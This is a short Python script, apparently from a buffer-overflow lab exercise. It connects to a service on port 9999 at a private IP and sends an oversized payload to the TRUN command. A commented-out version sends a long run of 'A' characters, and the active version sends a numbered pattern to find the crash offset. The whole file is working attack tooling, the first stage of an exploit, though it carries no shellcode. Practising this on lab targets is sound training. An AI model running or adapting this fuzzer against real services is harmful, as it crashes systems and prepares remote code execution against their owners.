import socket
# server = '192.168.227.1'
# port = 9999
# length = 1000000 #int(input('Length of attack: '))
# print_output = lambda sock: print (sock.recv(1024).decode("utf-8").strip())
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
#     connect = sock.connect((server, port))
#     print_output(sock)
#     print (f"Sending attack length {length} to TRUN .")
#     sock.send(str.encode(f"TRUN  .{'A' * length}\n"))
#     print_output(sock)
#     sock.send(str.encode('EXIT\n'))
#     print_output(sock)
#     sock.close()

import socket
port , server = 9999, '192.168.227.1'
length = int(input('Length of attack: '))
print_output = lambda sock: print (sock.recv(1024).decode("utf-8").strip())
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    connect = sock.connect((server, port))
    print_output(sock)
    print (f"Sending attack length {length} to TRUN .")
    attack = ''.join([f"{str(n).zfill(3)}A" for n in range(length)])
    sock.send(str.encode(f"TRUN .{attack}\n"))
    print_output(sock)
    sock.send(str.encode('EXIT\n'))
    print_output(sock)
    sock.close()